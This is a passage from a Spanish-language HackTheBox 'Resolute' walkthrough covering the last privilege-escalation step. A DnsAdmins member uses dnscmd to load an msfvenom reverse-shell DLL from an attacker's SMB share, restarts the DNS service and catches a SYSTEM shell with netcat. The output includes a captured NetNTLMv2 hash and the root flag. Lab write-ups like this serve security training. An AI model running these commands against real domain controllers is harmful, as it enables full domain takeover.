<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-ar---</span>        12/3/2019   7:34 AM            155 note.txt


<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>yan<span class="se">\D</span>esktop&gt; <span class="nb">type </span>note.txt
Email to team:

- due to change freeze, any system changes <span class="o">(</span>apart from those to the administrator account<span class="o">)</span> will be automatically reverted within 1 minute
</code></pre></div></div>

<ul>
  <li>Nos dicen lo siguiente <strong>cualquier modificación realizada en el sistema, excepto aquellas relacionadas con la cuenta de administrador, será revertida automáticamente en un plazo de 1 minuto</strong>.</li>
</ul>

<blockquote>
  <p>Una “change freeze” es una medida tomada por una organización para evitar realizar cambios significativos en sus sistemas, especialmente durante ciertos períodos críticos, como durante la implementación de actualizaciones importantes, períodos de alta actividad comercial o durante auditorías. Durante un “change freeze”, se pueden establecer políticas que limiten o prohíban ciertos tipos de cambios en los sistemas, con el objetivo de mantener la estabilidad y evitar posibles interrupciones o problemas operativos.</p>
</blockquote>

<ul>
  <li>
    <p>Pero bueno sabemos que aunque se haya impuesto un <code class="language-plaintext highlighter-rouge">"change freeze"</code> se permite realizar cambios en la cuenta del administrador.</p>
  </li>
  <li>
    <p>Vemos que formamos parte del grupo <code class="language-plaintext highlighter-rouge">DnsAdmins</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>yan<span class="se">\D</span>esktop&gt; <span class="nb">whoami</span> /all

USER INFORMATION
<span class="nt">----------------</span>

User Name     SID
<span class="o">=============</span> <span class="o">==============================================</span>
megabank<span class="se">\r</span>yan S-1-5-21-1392959593-3013219662-3596683436-1105


GROUP INFORMATION
<span class="nt">-----------------</span>

Group Name                                 Type             SID                                            Attributes
<span class="o">==========================================</span> <span class="o">================</span> <span class="o">==============================================</span> <span class="o">===============================================================</span>
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\U</span>sers                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\P</span>re-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="se">\R</span>emote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\N</span>ETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\A</span>uthenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="se">\T</span>his Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK<span class="se">\C</span>ontractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK<span class="se">\D</span>nsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY<span class="se">\N</span>TLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label<span class="se">\M</span>edium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                    State
<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled


USER CLAIMS INFORMATION
<span class="nt">-----------------------</span>

User claims unknown.

Kerberos support <span class="k">for </span>Dynamic Access Control on this device has been disabled.
</code></pre></div></div>

<blockquote>
  <p>El grupo “DnsAdmins” es un grupo de seguridad en los sistemas operativos Windows que tiene privilegios especiales para administrar y realizar cambios en el servicio de DNS (Domain Name System). Este grupo se utiliza específicamente para delegar ciertos privilegios de administración sobre la infraestructura de DNS a usuarios o administradores específicos en un entorno de red.</p>
</blockquote>

<ul>
  <li>Como tal nosotros formamos parte del Grupo <strong>Contractors</strong> y ese grupo forma parte del grupo <strong>DnsAdmins</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>yan<span class="se">\D</span>esktop&gt; net localgroup DnsAdmins
Alias name     DnsAdmins
Comment        DNS Administrators Group

Members

<span class="nt">-------------------------------------------------------------------------------</span>
Contractors
The <span class="nb">command </span>completed successfully.
</code></pre></div></div>

<ul>
  <li>
    <p>Lo que vamos a hacer es crear un <code class="language-plaintext highlighter-rouge">dll</code> malicioso para que cargue una <code class="language-plaintext highlighter-rouge">ddl</code> maliciosa cuando se inicie el servicio y cuando lo arranque obtener una reverse shell privilegiada <a href="https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/">https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/</a>.</p>
  </li>
  <li>
    <p>Vamos a usar <code class="language-plaintext highlighter-rouge">dnscmd</code> para que en el arranque del servicio <code class="language-plaintext highlighter-rouge">dns</code> carge nuestro <code class="language-plaintext highlighter-rouge">ddl</code> malicioso que crearemos con <code class="language-plaintext highlighter-rouge">msfvenom</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.222 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> dll <span class="nt">-o</span> zi.dll
<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes
Saved as: zi.dll
</code></pre></div></div>

<ul>
  <li>Ahora vamos a usar <code class="language-plaintext highlighter-rouge">smbserver</code> para compartir el recurso por <strong>smb</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
</code></pre></div></div>

<ul>
  <li>Ahora vamos a pasarlo tal como nos dicen en el recurso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>yan<span class="se">\D</span>esktop&gt; dnscmd.exe /config /serverlevelplugindll <span class="se">\\</span>10.10.14.222<span class="se">\s</span>mbFolder<span class="se">\z</span>i.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
</code></pre></div></div>

<ul>
  <li>Nos vamos a poner en escucha para que cuando arranquemos el servicio nos llegue la reverse shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<ul>
  <li>Ahora vamos a parar el servicio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>yan<span class="se">\D</span>esktop&gt; sc.exe stop dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                <span class="o">(</span>STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN<span class="o">)</span>
        WIN32_EXIT_CODE    : 0  <span class="o">(</span>0x0<span class="o">)</span>
        SERVICE_EXIT_CODE  : 0  <span class="o">(</span>0x0<span class="o">)</span>
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
</code></pre></div></div>

<ul>
  <li>Ahora lo iniciamos para que se realice la autenticación y cargue el <code class="language-plaintext highlighter-rouge">dll</code> malicioso.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\r</span>yan<span class="se">\D</span>esktop&gt; sc.exe
start dns

SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                <span class="o">(</span>NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN<span class="o">)</span>
        WIN32_EXIT_CODE    : 0  <span class="o">(</span>0x0<span class="o">)</span>
        SERVICE_EXIT_CODE  : 0  <span class="o">(</span>0x0<span class="o">)</span>
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3132
        FLAGS              :
</code></pre></div></div>

<h2 id="roottxt">root.txt</h2>

<ul>
  <li>Recibimos la shell. (En caso de que no te funcione para e inicia el servicio varias veces o también vuelve a ejecutar el <code class="language-plaintext highlighter-rouge">dnscmd.exe</code>).</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
Impacket v0.11.0 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.129.96.155,52274<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>MEGABANK<span class="se">\R</span>ESOLUTE<span class="nv">$,</span>RESOLUTE<span class="o">)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> User RESOLUTE<span class="se">\R</span>ESOLUTE<span class="nv">$ </span>authenticated successfully
<span class="o">[</span><span class="k">*</span><span class="o">]</span> RESOLUTE<span class="nv">$:</span>:MEGABANK:aaaaaaaaaaaaaaaa:5fd11fc9f6cc3724acfde84f043b1d72:01010000000000008046e3536381da0167b141b477c8e25f00000000010010007100530072006e004c00520077007600030010007100530072006e004c00520077007600020010007500480075005a006c00420043004e00040010007500480075005a006c00420043004e00070008008046e3536381da0106000400020000000800300030000000000000000000000000400000ddc6f9f12cfdc0fd4d7049096a7d95a949c54ef52ba4f03393f0195cbfabcacb0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003200320032000000000000000000
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>2:smbFolder<span class="o">)</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.222] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.96.155] 52275
Microsoft Windows <span class="o">[</span>Version 10.0.14393]
<span class="o">(</span>c<span class="o">)</span> 2016 Microsoft Corporation. All rights reserved.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
<span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;type C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
<span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
56b547be1d0d3bd3405a6e44e23e164b
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry></feed>